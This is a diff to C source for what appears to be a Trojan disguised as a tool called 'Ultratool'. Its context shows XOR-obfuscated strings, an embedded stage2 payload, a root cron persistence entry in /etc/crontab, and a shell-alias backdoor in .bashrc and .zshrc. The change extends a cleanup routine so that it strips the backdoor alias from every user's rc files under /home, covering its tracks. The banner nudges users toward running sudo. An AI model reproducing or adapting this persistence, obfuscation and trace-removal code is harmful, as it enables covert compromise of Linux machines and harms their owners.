@@ -31,6 +31,8 @@ extern const int _binary_stage2_comp_size;
 //#define PERSISTENCE_XOR "/tmp/.entry-3tps-93f8u-rprt"
 //#define CRON_XOR "*/5 * * * * root /tmp/.entry-3tps-93f8u-rprt\n"
 //#define CRON_FILE_XOR "/etc/crontab"
+//#define ZSHRC_FORMAT_XOR "%s/.zshrc"
+//#define BASHRC_FORMAT_XOR "%s/.bashrc"
 // END_SOURCE_STRINGS
 
 //START OBFUSCATING
@@ -161,7 +163,7 @@ int check_filecontains(FILE * fd, char * to_search) {
     int buf_ptr = 0;
 
     for (int i = 0; i < len; i++) {
-       if (search_buf[buf_ptr] == *(file_buf + i) ) {
+       if (search_buf[buf_ptr] == *(file_buf + i) ) { 
 	   buf_ptr++;
 	   if (buf_ptr == window_len) {
 	       free(file_buf);
@@ -191,38 +193,48 @@ void backdoor_cron() {
  * Clean up the .bashrc files
  */
 void clean_rcfiles() {
-    const char * homedir = getenv("HOME");
-    char str[256];
 
-    if (homedir != NULL) {
-        snprintf(str, 256,dexor(ZSHRC_XOR),  homedir);
-        FILE * rc_file = fopen(str, "r");
-        // Look for zshrc 
-	if (rc_file) {
-	   if (check_filecontains(rc_file, dexor(ALIAS_STR_XOR))) { 
-                fseek(rc_file, 0, SEEK_END);
-                int size = ftell(rc_file);
-                fclose(rc_file);
-	        int xor_len = strlen(dexor(ALIAS_STR_XOR));
-                // Truncate off the bytes for the .bashrc backdoor
-                ftruncate(str, size - xor_len);	 
-	    }
-	}
+    struct dirent * users_dir;
+    DIR *d = opendir("/home/");
 
-        snprintf(str, 256, dexor(BASHRC_XOR), homedir);
-        // Look for bashrc
-        rc_file = fopen(str, "r");
-        if (rc_file) {
-	    if (check_filecontains(rc_file, dexor(ALIAS_STR_XOR))) {
-                fseek(rc_file, 0, SEEK_END);
-                int size = ftell(rc_file);
-                fclose(rc_file);
-	        int xor_len = strlen(dexor(ALIAS_STR_XOR));
-    	        // Truncate off the bytes for the .bashrc backdoor
-                ftruncate(str, size - xor_len);  
+    if (d) {
+        while ((users_dir = readdir(d)) != NULL) {
+            if (strcmp(users_dir->d_name, ".") == 0 || strcmp(users_dir->d_name, "..") == 0)
+                continue;
+            char path[256];
+            snprintf(path, sizeof(path), "/home/%s", users_dir->d_name);
+            char final_path[256];
+
+            snprintf(final_path, sizeof(final_path), dexor(ZSHRC_FORMAT_XOR),path);
+            
+            FILE * rc_file = fopen(final_path, "r+");            
+	    // Look for zshrc 
+	    if (rc_file) {
+                if (check_filecontains(rc_file, dexor(ALIAS_STR_XOR))) { 
+                    fseek(rc_file, 0, SEEK_END);
+                    int size = ftell(rc_file);
+                    int xor_len = strlen(dexor(ALIAS_STR_XOR));
+                    // Truncate off the bytes for the .bashrc backdoor
+                    ftruncate(fileno(rc_file), size - xor_len);
+                    fclose(rc_file);
+	        }
 	    }
-	}
-    } 
+ 
+            snprintf(final_path, sizeof(final_path), dexor(BASHRC_FORMAT_XOR),path);
+            // Look for bashrc
+            rc_file = fopen(final_path, "r+");
+            if (rc_file) {
+	        if (check_filecontains(rc_file, dexor(ALIAS_STR_XOR))) {
+                    fseek(rc_file, 0, SEEK_END);
+                    int size = ftell(rc_file);
+	            int xor_len = strlen(dexor(ALIAS_STR_XOR));                    
+    	            // Truncate off the bytes for the .bashrc backdoor
+                    ftruncate(fileno(rc_file), size - xor_len); 
+		    fclose(rc_file);
+                }
+            }
+        }
+    }
 }
 
 /**
@@ -238,7 +250,7 @@ void print_banner() {
     printf("                               \\/                         \n");
     printf("                                                          \n");
     printf("                                                         \n");
-    printf("    Thank you for trying Ultratool! We have detected that your system is \n out of date. Please run 'sudo apt update' or 'sudo yum update' to resolve this issue.");
+    printf("    Thank you for trying Ultratool! We have detected that your system is \n out of date. Please run 'sudo apt update' to resolve this issue.");
 }
 
 /**
